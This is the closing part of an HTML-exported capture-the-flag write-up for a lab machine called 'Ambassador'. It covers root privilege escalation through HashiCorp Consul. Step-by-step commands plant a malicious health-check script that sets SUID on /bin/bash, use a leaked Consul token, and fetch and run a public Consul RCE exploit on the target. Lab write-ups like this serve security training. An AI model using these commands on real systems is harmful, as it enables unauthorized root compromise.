</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251115210718.png" src="img/pasted-image-20251115210718.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251115210718.png" src="img/pasted-image-20251115210718.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">As shown in the image, the two requirements are contemplated, so next the mentioned exploitation process will be performed as follows:</p></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token function">nano</span> revhsell.hcl
<span class="token builtin class-name">export</span> <span class="token assign-left variable">CONSUL_HTTP_TOKEN</span><span class="token operator">=</span>bb03b43b-1d81-d62b-24b5-39540ee469b5
consul reload
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251115211335.png" src="img/pasted-image-20251115211335.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251115211335.png" src="img/pasted-image-20251115211335.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">First, a malicious health script (<code>.hcl</code>) was created, which contains a typical structure, but the most important parameters were <code>enable_script_checks = true</code>, which allows code execution, and the <code>args</code> parameter, which contains the malicious command. In this case, it grants <code>SUID</code> permissions to <code>/bin/bash</code>. With these permissions, <code>/bin/bash</code> can be executed as its owner, which is <code>root</code>. To make <code>Consul</code> execute this health script, the <code>consul reload</code> command was executed, but for the command to work the <code>Consul HTTP token</code> must be included in the environment variable <code>CONSUL_HTTP_TOKEN</code>. With everything done, <code>/bin/bash</code> finally has <code>SUID</code> permissions, and then a <code>root bash session</code> will be obtained:</p></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token function">bash</span> <span class="token parameter variable">-p</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251115211403.png" src="img/pasted-image-20251115211403.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251115211403.png" src="img/pasted-image-20251115211403.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">The <code>root</code> session was successfully obtained, and to conclude the pwn of the machine, the <code>root</code> flag will be shown. However, before that, another way to exploit this vulnerability will be demonstrated:</p></div><div class="el-h3"><h3 data-heading="Hashicorp Consul Automated Exploitation Using a Git Exploit" dir="auto" class="heading" id="Hashicorp_Consul_Automated_Exploitation_Using_a_Git_Exploit_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Hashicorp Consul Automated Exploitation Using a Git Exploit</h3></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token function">git</span> clone https://github.com/owalid/consul-rce
python3 <span class="token parameter variable">-m</span> http.server <span class="token number">80</span>
<span class="token function">wget</span> http://10.10.16.6/consul_rce.py
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251117000457.png" src="img/pasted-image-20251117000457.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251117000457.png" src="img/pasted-image-20251117000457.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">As shown in the image, a <code>Git</code> exploit was downloaded and transferred to the victim machine. This exploit can automate the exploitation as follows:</p></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded">python3 consul_rce.py <span class="token parameter variable">-th</span> <span class="token number">127.0</span>.0.1 <span class="token parameter variable">-tp</span> <span class="token number">8500</span> <span class="token parameter variable">-c</span> <span class="token string">"chmod u+s /bin/bash"</span> <span class="token parameter variable">-ct</span> <span class="token string">"bb03b43b-1d81-d62b-24b5-39540ee469b5"</span>
<span class="token function">bash</span> <span class="token parameter variable">-p</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251117114107.png" src="img/pasted-image-20251117114107.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251117114107.png" src="img/pasted-image-20251117114107.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">The <code>Git</code> exploit was executed with the required parameters. The reason for specifying port <code>8500</code> is that it is the default port for <code>Consul</code>. With this and the <code>Consul HTTP token</code> provided, the exploitation worked and granted <code>SUID</code> permissions to <code>/bin/bash</code>, allowing a <code>privileged bash</code> to be obtained as the <code>root</code> user. Finally, the <code>root</code> flag will be shown:</p></div><div class="el-h2"><h2 data-heading="Root Flag" dir="auto" class="heading" id="Root_Flag_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Root Flag</h2></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251115211425.png" src="img/pasted-image-20251115211425.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251115211425.png" src="img/pasted-image-20251115211425.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">Finally, the target machine was successfully pwned!!</p></div><div class="el-h1"><h1 data-heading="References" dir="auto" class="heading" id="References_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>References</h1></div><div class="el-p"><p dir="auto"><strong>Grafana: Sensitive File Targets</strong> -&gt; <a data-tooltip-position="top" aria-label="https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/grafana.html?highlight=grafana#grafana" rel="noopener nofollow" class="external-link is-unresolved" href="https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/grafana.html?highlight=grafana#grafana" target="_self">Link</a><br>
<strong>Consul RCE Git Exploit</strong> -&gt; <a data-tooltip-position="top" aria-label="https://github.com/owalid/consul-rce" rel="noopener nofollow" class="external-link is-unresolved" href="https://github.com/owalid/consul-rce" target="_self">Link</a></p></div><div class="footer"><div class="data-bar"></div></div></div></div></div><div id="right-content" class="leaf" style="--sidebar-width: var(--sidebar-width-right);"><div id="right-sidebar" class="sidebar"><div class="sidebar-handle"></div><div class="sidebar-topbar"><div class="topbar-content"></div><div class="clickable-icon sidebar-collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" class="svg-icon"><path d="M21 3H3C1.89543 3 1 3.89543 1 5V19C1 20.1046 1.89543 21 3 21H21C22.1046 21 23 20.1046 23 19V5C23 3.89543 22.1046 3 21 3Z"></path><path d="M10 4V20"></path><path d="M4 7H7"></path><path d="M4 10H7"></path><path d="M4 13H7"></path></svg></div></div><div class="sidebar-content-wrapper"><div id="right-sidebar-content" class="leaf-content"><div id="outline" class=" tree-container"><div class="feature-header"><div class="feature-title">Table Of Contents</div><button class="clickable-icon nav-action-button tree-collapse-all" aria-label="Collapse All"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></svg></button></div><div class="tree-item" data-depth="1"><a class="tree-item-self is-clickable" href="machine-ambassador.html#Machine_Ambassador_0" data-path="#Machine_Ambassador_0"><div class="tree-item-inner heading-link" heading-name="Machine Ambassador">Machine Ambassador</div></a><div class="tree-item-children"></div></div><div class="tree-item mod-collapsible" data-depth="1"><a class="tree-item-self is-clickable mod-collapsible" href="machine-ambassador.html#Information_Gathering_0" data-path="#Information_Gathering_0"><div class="tree-item-icon collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><div class="tree-item-inner heading-link" heading-name="Information Gathering">Information Gathering</div></a><div class="tree-item-children"><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-ambassador.html#Discovering_OS_via_TTL_Using_`ping`_0" data-path="#Discovering_OS_via_TTL_Using_`ping`_0"><div class="tree-item-inner heading-link" heading-name="Discovering OS via TTL Using `ping`">Discovering OS via TTL Using <code>ping</code></div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-ambassador.html#UDP_Port_Scan_Using_`nmap`_0" data-path="#UDP_Port_Scan_Using_`nmap`_0"><div class="tree-item-inner heading-link" heading-name="UDP Port Scan Using `nmap`">UDP Port Scan Using <code>nmap</code></div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-ambassador.html#TCP_Port_Scan_Using_a_Custom_`.zshrc`_Function_(`jmap`)_0" data-path="#TCP_Port_Scan_Using_a_Custom_`.zshrc`_Function_(`jmap`)_0"><div class="tree-item-inner heading-link" heading-name="TCP Port Scan Using a Custom `.zshrc` Function (`jmap`)">TCP Port Scan Using a Custom <code>.zshrc</code> Function (<code>jmap</code>)</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-ambassador.html#Represent_Scan_Information_Legibly_Using_a_`.zshrc`_Custom_Function_(`extractPorts`)_0" data-path="#Represent_Scan_Information_Legibly_Using_a_`.zshrc`_Custom_Function_(`extractPorts`)_0"><div class="tree-item-inner heading-link" heading-name="Represent Scan Information Legibly Using  a `.zshrc` Custom Function (`extractPorts`)">Represent Scan Information Legibly Using  a <code>.zshrc</code> Custom Function (<code>extractPorts</code>)</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-ambassador.html#Discovering_Service_Versions_on_Open_TCP_Ports_Using_a_`.zshrc`_Custom_Function_(`jmap2`)_0" data-path="#Discovering_Service_Versions_on_Open_TCP_Ports_Using_a_`.zshrc`_Custom_Function_(`jmap2`)_0"><div class="tree-item-inner heading-link" heading-name="Discovering Service Versions on Open TCP Ports Using a `.zshrc` Custom Function (`jmap2`)">Discovering Service Versions on Open TCP Ports Using a <code>.zshrc</code> Custom Function (<code>jmap2</code>)</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-ambassador.html#TCP_Port_80_&amp;_3000_Identifying_Technologies_and_Services_on_the_Web_Service_Using_`whatweb`_&amp;_`wappalyzer`_0" data-path="#TCP_Port_80_&amp;_3000_Identifying_Technologies_and_Services_on_the_Web_Service_Using_`whatweb`_&amp;_`wappalyzer`_0"><div class="tree-item-inner heading-link" heading-name="TCP Port 80 &amp; 3000: Identifying Technologies and Services on the Web Service Using `whatweb` &amp; `wappalyzer`">TCP Port 80 &amp; 3000: Identifying Technologies and Services on the Web Service Using <code>whatweb</code> &amp; <code>wappalyzer</code></div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-ambassador.html#TCP_Port_80_&amp;_3000_Source_Code_Inspection_0" data-path="#TCP_Port_80_&amp;_3000_Source_Code_Inspection_0"><div class="tree-item-inner heading-link" heading-name="TCP Port 80 &amp; 3000: Source Code Inspection">TCP Port 80 &amp; 3000: Source Code Inspection</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-ambassador.html#TCP_Port_80_&amp;_3000_Discovering_Routes_and_Resources_Using_`dirsearch`_0" data-path="#TCP_Port_80_&amp;_3000_Discovering_Routes_and_Resources_Using_`dirsearch`_0"><div class="tree-item-inner heading-link" heading-name="TCP Port 80 &amp; 3000: Discovering Routes and Resources Using `dirsearch`">TCP Port 80 &amp; 3000: Discovering Routes and Resources Using <code>dirsearch</code></div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-ambassador.html#TCP_Port_80_&amp;_3000_Web_Enumeration_0" data-path="#TCP_Port_80_&amp;_3000_Web_Enumeration_0"><div class="tree-item-inner heading-link" heading-name="TCP Port 80 &amp; 3000: Web Enumeration">TCP Port 80 &amp; 3000: Web Enumeration</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-ambassador.html#TCP_Port_3000_Identifying_Vulnerabilities_for_Grafana_v8.2.0_Using_`searchsploit`_0" data-path="#TCP_Port_3000_Identifying_Vulnerabilities_for_Grafana_v8.2.0_Using_`searchsploit`_0"><div class="tree-item-inner heading-link" heading-name="TCP Port 3000: Identifying Vulnerabilities for Grafana v8.2.0 Using `searchsploit`">TCP Port 3000: Identifying Vulnerabilities for Grafana v8.2.0 Using <code>searchsploit</code></div></a><div class="tree-item-children"></div></div></div></div><div class="tree-item mod-collapsible" data-depth="1"><a class="tree-item-self is-clickable mod-collapsible" href="machine-ambassador.html#Exploitation_0" data-path="#Exploitation_0"><div class="tree-item-icon collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><div class="tree-item-inner heading-link" heading-name="Exploitation">Exploitation</div></a><div class="tree-item-children"><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-ambassador.html#TCP_Port_3000_Grafana_v8.2.0_-_Unauthorized_Arbitrary_File_Read_Vulnerability_(CVE-2021-43798)_0" data-path="#TCP_Port_3000_Grafana_v8.2.0_-_Unauthorized_Arbitrary_File_Read_Vulnerability_(CVE-2021-43798)_0"><div class="tree-item-inner heading-link" heading-name="TCP Port 3000: Grafana v8.2.0 - Unauthorized Arbitrary File Read Vulnerability (CVE-2021-43798)">TCP Port 3000: Grafana v8.2.0 - Unauthorized Arbitrary File Read Vulnerability (CVE-2021-43798)</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-ambassador.html#TCP_Port_3000_Enumerating_a_Grafana_Sqlite3_File_-_`/var/lib/grafana/grafana.db`_0" data-path="#TCP_Port_3000_Enumerating_a_Grafana_Sqlite3_File_-_`/var/lib/grafana/grafana.db`_0"><div class="tree-item-inner heading-link" heading-name="TCP Port 3000: Enumerating a Grafana Sqlite3 File - `/var/lib/grafana/grafana.db`">TCP Port 3000: Enumerating a Grafana Sqlite3 File - <code>/var/lib/grafana/grafana.db</code></div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-ambassador.html#TCP_Port_3306_MySQL_Enumeration_0" data-path="#TCP_Port_3306_MySQL_Enumeration_0"><div class="tree-item-inner heading-link" heading-name="TCP Port 3306: MySQL Enumeration">TCP Port 3306: MySQL Enumeration</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-ambassador.html#Base64‑Encoded_Password_Decoding_0" data-path="#Base64‑Encoded_Password_Decoding_0"><div class="tree-item-inner heading-link" heading-name="Base64‑Encoded Password Decoding">Base64‑Encoded Password Decoding</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-ambassador.html#TCP_Port_22_SSH_Initial_Access_0" data-path="#TCP_Port_22_SSH_Initial_Access_0"><div class="tree-item-inner heading-link" heading-name="TCP Port 22: SSH Initial Access">TCP Port 22: SSH Initial Access</div></a><div class="tree-item-children"></div></div></div></div><div class="tree-item mod-collapsible" data-depth="1"><a class="tree-item-self is-clickable mod-collapsible" href="machine-ambassador.html#Post-Exploitation_0" data-path="#Post-Exploitation_0"><div class="tree-item-icon collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><div class="tree-item-inner heading-link" heading-name="Post-Exploitation">Post-Exploitation</div></a><div class="tree-item-children"><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-ambassador.html#User_Flag_0" data-path="#User_Flag_0"><div class="tree-item-inner heading-link" heading-name="User Flag">User Flag</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-ambassador.html#Git_Enumeration_0" data-path="#Git_Enumeration_0"><div class="tree-item-inner heading-link" heading-name="Git Enumeration">Git Enumeration</div></a><div class="tree-item-children"></div></div><div class="tree-item mod-collapsible" data-depth="2"><a class="tree-item-self is-clickable mod-collapsible" href="machine-ambassador.html#Privilege_Escalation_0" data-path="#Privilege_Escalation_0"><div class="tree-item-icon collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><div class="tree-item-inner heading-link" heading-name="Privilege Escalation">Privilege Escalation</div></a><div class="tree-item-children"><div class="tree-item" data-depth="3"><a class="tree-item-self is-clickable" href="machine-ambassador.html#Hashicorp_Consul_Exploitation_–_Forcing_Consul_Reload_to_Execute_Code_Injection_in_Health_Scripts_(`.hcl`)_0" data-path="#Hashicorp_Consul_Exploitation_–_Forcing_Consul_Reload_to_Execute_Code_Injection_in_Health_Scripts_(`.hcl`)_0"><div class="tree-item-inner heading-link" heading-name="Hashicorp Consul Exploitation – Forcing Consul Reload to Execute Code Injection in Health Scripts (`.hcl`)">Hashicorp Consul Exploitation – Forcing Consul Reload to Execute Code Injection in Health Scripts (<code>.hcl</code>)</div></a><div class="tree-item-children"></div></div><div class="tree-item" data-depth="3"><a class="tree-item-self is-clickable" href="machine-ambassador.html#Hashicorp_Consul_Automated_Exploitation_Using_a_Git_Exploit_0" data-path="#Hashicorp_Consul_Automated_Exploitation_Using_a_Git_Exploit_0"><div class="tree-item-inner heading-link" heading-name="Hashicorp Consul Automated Exploitation Using a Git Exploit">Hashicorp Consul Automated Exploitation Using a Git Exploit</div></a><div class="tree-item-children"></div></div></div></div><div class="tree-item" data-depth="2"><a class="tree-item-self is-clickable" href="machine-ambassador.html#Root_Flag_0" data-path="#Root_Flag_0"><div class="tree-item-inner heading-link" heading-name="Root Flag">Root Flag</div></a><div class="tree-item-children"></div></div></div></div><div class="tree-item" data-depth="1"><a class="tree-item-self is-clickable" href="machine-ambassador.html#References_0" data-path="#References_0"><div class="tree-item-inner heading-link" heading-name="References">References</div></a><div class="tree-item-children"></div></div></div></div></div><script defer="">let rs = document.querySelector("#right-sidebar"); rs.classList.toggle("is-collapsed", window.innerWidth < 768); rs.style.setProperty("--sidebar-width", localStorage.getItem("sidebar-right-width"));</script></div></div></div></div></body></html>